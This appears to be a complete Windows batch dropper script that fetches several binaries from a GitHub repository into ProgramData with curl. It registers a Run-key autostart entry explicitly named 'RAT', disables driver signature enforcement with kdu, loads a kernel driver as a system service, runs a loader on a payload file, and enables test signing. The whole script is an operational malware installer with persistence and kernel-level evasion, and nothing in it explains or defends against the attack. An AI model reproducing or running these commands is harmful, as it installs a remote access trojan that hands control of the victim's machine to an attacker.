cd C:/ProgramData
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/Cdll.bin
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/kdu.exe
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/CEsys.sys
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/DrvCom.exe
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/drv64.dll
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAT /d ""C:\ProgramData\DrvCom.exe" -f c:\programdata\Cdll.bin" /t REG_SZ
kdu -dse 0
sc create lolski binPath= "C:\ProgramData\CEsys.sys" type= kernel start= system
sc start lolski
DrvCom -f c:\programdata\Cdll.bin
bcdedit /set testsigning on

